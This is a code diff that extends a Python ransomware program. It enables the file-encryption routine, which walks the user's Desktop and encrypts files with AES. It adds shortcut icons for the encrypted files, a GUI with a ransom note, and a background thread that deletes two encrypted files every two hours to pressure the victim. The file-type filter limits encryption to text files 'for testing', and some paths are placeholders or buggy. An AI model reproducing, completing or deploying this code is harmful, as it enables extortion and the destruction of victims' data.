@@ -23,6 +23,12 @@ import psutil
 import socket
 from datetime import datetime, timedelta
 from PyQt5.QtWidgets import QLineEdit, QMessageBox, QInputDialog
+import time
+import winshell
+import win32com.client
+from win32com.client import Dispatch
+
+
 
 # Initialize global variables
 SPI_SETDESKWALLPAPER = 0x0014
@@ -85,7 +91,7 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         self.randomId = self.rID(12)                # generates a randID 12 length using rID method
         self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
         self.decryptionPass = self.rSeed(32)
-        self.filePath = "C:\\Users\\"               # sets file path attribute 
+        self.filePath = "C:\\Users\\{self.userName}\\Desktop\\"               # sets file path attribute 
         self.ip = ""                                # inits ip attribute to empty string 4 later
         self.userName = ""                          # inits userName attribute to empty string 4 later
         key = self.encryptionPass.encode()          # encodes encryption pass into bytes to be used as key for encryption
@@ -107,16 +113,32 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
         except Exception as e:                      # error catch
             print(f"Error getting user details: {e}")
 
-    #Encrypt file using AES Encryption
+# Modify the encryption part of the encryptFile method
     def encryptFile(self, file):
         try:
+            key = self.encryptionPass.encode()  # Convert encryption pass to bytes
+            cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()  # Create encryptor
             with open(file, 'rb') as infile:
-                plaintext = pad(infile.read(), 16)  # Block size is 16 bytes for AES
-                ciphertext = self.crypto.update(plaintext) + self.crypto.finalize()
-                with open(file, "wb") as outfile:
-                    outfile.write(ciphertext)
+                plaintext = padding.PKCS7(128).padder().update(infile.read())  # Add padding to plaintext
+                ciphertext = cipher.update(plaintext) + cipher.finalize()  # Encrypt plaintext
+            with open(file, "wb") as outfile:
+                outfile.write(ciphertext)
+        
+            # Change icon of encrypted file
+            self.change_file_icon(file)
         except Exception as e:
             print(f"Error encrypting {file}: {e}")
+
+
+
+    def change_file_icon(self, file_path):
+        file_name = os.path.basename(file_path)
+        shell = win32com.client.Dispatch("WScript.Shell")
+        desktop = shell.SpecialFolders("Desktop")
+        shortcut = shell.CreateShortCut(os.path.join(desktop, file_name + '.lnk'))
+        shortcut.IconLocation = 'icon.png'
+        shortcut.Save()
+
 
     def decryptFile(self, file, decryption_key):
         try:
@@ -127,23 +149,39 @@ class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherit
                 plaintext = cipher.update(ciphertext) + cipher.finalize()
                 unpadder = padding.PKCS7(128).unpadder()
                 decrypted_data = unpadder.update(plaintext) + unpadder.finalize()
-                with open(file, "wb") as outfile:
-                    outfile.write(decrypted_data)
+            with open(file, "wb") as outfile:
+                outfile.write(decrypted_data)
         except Exception as e:
             print(f"Error decrypting {file}: {e}")
 
     # Main method for ransomware functionality
 
-    '''def run(self):
+    def run(self, userName):
+        self.userName = userName
+        print("Starting encryption process...")
         self.sendMessage()
-        for root, directories, files in os.walk(self.filePath):
+
+        print("Traversing directories and encrypting files...")
+        for root, directories, files in os.walk(f"C:\\Users\\{self.userName}\\Desktop"):
             for filename in files:
                 filepath = os.path.join(root, filename)
-                for base in fileTypes:
-                    if base in filepath:
-                        threading.Thread(target=self.encryptFile, args=(filepath,)).start()
+                if filename.endswith('.txt'):  # Encrypt only text files for testing
+                    threading.Thread(target=self.encryptFile, args=(filepath,)).start()
+            
+            for directory in directories:  # Traverse through subdirectories
+                subdir_path = os.path.join(root, directory)
+                for subdir_root, subdir_directories, subdir_files in os.walk(subdir_path):
+                    for subdir_filename in subdir_files:
+                        subdir_filepath = os.path.join(subdir_root, subdir_filename)
+                        if subdir_filename.endswith('.txt'):  # Encrypt only text files for testing
+                            threading.Thread(target=self.encryptFile, args=(subdir_filepath,)).start()
 
-        self.readMe()'''
+        self.readMe()
+        print("Encryption process completed.")
+
+
+
+
 
 
     
@@ -242,6 +280,9 @@ class RansomwareGUI(QMainWindow):
         self.btcAdd = ""
         self.email = ""
         self.decryptionPass = decryptionPass
+        self.delete_files_task = threading.Thread(target=self.schedule_file_deletion)
+        self.delete_files_task.daemon = True  # Set the thread as a daemon so it exits when the main program exits
+        self.delete_files_task.start()
 
         # Define ransom note
         self.ransomNote = f"""
@@ -267,7 +308,9 @@ class RansomwareGUI(QMainWindow):
         self.startEncryptionProgress()
         self.startDecryptionCountdown()
 
+        userName = os.getlogin()
         ransomware_instance = Ransomware()
+        ransomware_instance.run(userName) 
         ransomware_instance.sendMessage()
         ransomware_instance.readMe()
 
@@ -300,6 +343,29 @@ class RansomwareGUI(QMainWindow):
                     color: #fff;                                
                 }
             """)
+    def schedule_file_deletion(self):
+        while True:
+            time.sleep(2 * 60 * 60)  # Wait for two hours
+
+            # Check if decryption key has not been entered correctly
+            if not self.decryptionPass:
+                # Permanently delete two encrypted files
+                encrypted_files = self.get_encrypted_files()
+                if len(encrypted_files) >= 2:
+                    files_to_delete = random.sample(encrypted_files, 2)
+                    for file in files_to_delete:
+                        os.remove(file)
+                        print(f"Deleted encrypted file: {file}")
+
+    def get_encrypted_files(self):
+        encrypted_files = []
+        for root, directories, files in os.walk('path_to_your_directory'):
+            for filename in files:
+                filepath = os.path.join(root, filename)
+                # Add criteria to identify encrypted files
+                if filename.endswith('.encrypted'):  # Example criteria (change as per your encryption method)
+                    encrypted_files.append(filepath)
+        return encrypted_files
     
     def promptDecryptionKey(self):
         # Prompt for decryption key
